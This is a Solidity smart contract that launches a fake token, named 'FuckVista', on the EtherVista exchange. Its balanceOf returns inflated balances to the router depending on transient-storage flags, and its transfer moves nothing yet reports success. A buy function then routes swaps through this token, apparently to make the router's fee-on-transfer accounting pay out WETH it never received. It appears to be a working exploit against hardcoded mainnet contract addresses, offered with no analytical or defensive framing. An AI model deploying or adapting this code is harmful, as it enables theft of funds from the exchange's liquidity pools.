// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {ERC20} from "./ERC20.sol";

interface EtherVistaFactory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IPair {
    function sync() external;
}

interface EtherVistaRouter {
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function launch(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        uint8 buyLpFee,
        uint8 sellLpFee,
        uint8 buyProtocolFee,
        uint8 sellProtocolFee,
        address protocolAddress
    ) external payable;

    function usdcToEth(uint256 amount) external view returns (uint256);
}

contract Wrap is ERC20 {
    EtherVistaRouter constant ROUTER = EtherVistaRouter(0xEAaa41cB2a64B11FE761D41E747c032CdD60CaCE);
    EtherVistaFactory constant FACTORY = EtherVistaFactory(0x9a27cb5ae0B2cEe0bb71f9A85C0D60f3920757B4);
    ERC20 constant WETH = ERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    uint256 constant FUNKY_SLOT = 0;
    uint256 constant PRE_BALANCE_SLOT = 1;

    address immutable pair;

    constructor() {
        pair = pairFor(address(FACTORY), address(this), address(WETH));
    }

    function initialize() external payable {
        _approve(address(this), address(ROUTER), type(uint256).max);
        _mint(address(this), 10 ether);

        ROUTER.launch{value: 10}(address(this), 1e6, 0, 0, 0, 0, 0, 0, address(this));

        refundDust();
    }

    function name() public pure override returns (string memory) {
        return "FuckVista";
    }

    function symbol() public pure override returns (string memory) {
        return "FV";
    }

    function balanceOf(address account) public view override returns (uint256) {
        uint256 _funky = funky();
        if (msg.sender == address(ROUTER) && _funky == 1) {
            return 1e9 ether;
        }

        uint256 _preBalance = preBalance();
        if (WETH.balanceOf(address(pair)) < _preBalance && _preBalance > 0 && _funky == 1) {
            return 1e9 ether;
        }
        return 1e6;
    }

    function transfer(address to, uint256 value) public override returns (bool) {
        setFunky(funky() + 1);
        if (funky() == 1) {
            setPreBalance(WETH.balanceOf(address(to)));
        }
        return true;
    }

    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {
        (tokenA, tokenB) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        pair = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            hex"ff",
                            factory,
                            keccak256(abi.encodePacked(tokenA, tokenB)),
                            hex"e260b72768e8ec6814aa811c576f346d208ba00840f835949d65c6424ac80a8d" // init code hash
                        )
                    )
                )
            )
        );
    }

    function buy(address token, uint256 minOut, uint256 deadline) external payable returns (uint256) {
        IPair(pair).sync();

        address[] memory path = new address[](4);
        path[0] = address(WETH);
        path[1] = address(this);
        path[2] = address(WETH);
        path[3] = address(token);

        uint256 prevAmount = ERC20(token).balanceOf(address(msg.sender));

        bytes memory data = abi.encodeWithSelector(
            ROUTER.swapExactETHForTokensSupportingFeeOnTransferTokens.selector, minOut, path, msg.sender, deadline
        );

        (bool success,) = address(ROUTER).call{value: msg.value}(data);
        require(success, "Router call failed");
        refundDust();

        uint256 newAmount = ERC20(token).balanceOf(address(msg.sender));
        // incase someone calls it multiple times 
        setFunky(0);
        return newAmount - prevAmount;
    }

    function fee() internal view returns (uint256) {
        return ROUTER.usdcToEth(1);
    }

    receive() external payable {}

    function refundDust() internal {
        payable(msg.sender).transfer(address(this).balance);
    }

    function funky() internal view returns (uint256) {
        uint256 v;
        assembly {
            v := tload(FUNKY_SLOT)
        }
        return v;
    }

    function setFunky(uint256 v) internal {
        assembly {
            tstore(FUNKY_SLOT, v)
        }
    }

    function preBalance() internal view returns (uint256) {
        uint256 v;
        assembly {
            v := tload(PRE_BALANCE_SLOT)
        }
        return v;
    }

    function setPreBalance(uint256 v) internal {
        assembly {
            tstore(PRE_BALANCE_SLOT, v)
        }
    }
}
